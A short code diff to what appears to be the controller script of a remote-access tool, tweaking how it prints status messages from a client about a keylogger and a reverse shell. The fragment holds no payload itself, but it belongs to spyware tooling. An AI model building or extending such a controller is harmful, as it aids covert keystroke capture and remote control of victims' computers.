@@ -81,7 +81,7 @@ while True:
                     msg = msg.decode(utils.ENCODING)
                         
                     if msg == "keylogger stopped":
-                        print("keylogger stopped. good bye!")
+                        print("keylogger stopped")
                         break
                     elif msg == "logging activated":
                         print("logging activated")
@@ -91,10 +91,9 @@ while True:
                         reverse_shell_active = True
                     elif msg == "reverse shell deactivated":
                         reverse_shell_active = False
-                    elif msg == "received":
-                        pass
+                    elif msg == "unknown command":
+                        print(f"unknown command: {inpt}")
                     else:
-                        print(msg)
-
+                        print(f"unknown answer from client: {msg}")
 conn.close()
-print("Connection closed.")
+print("good bye")
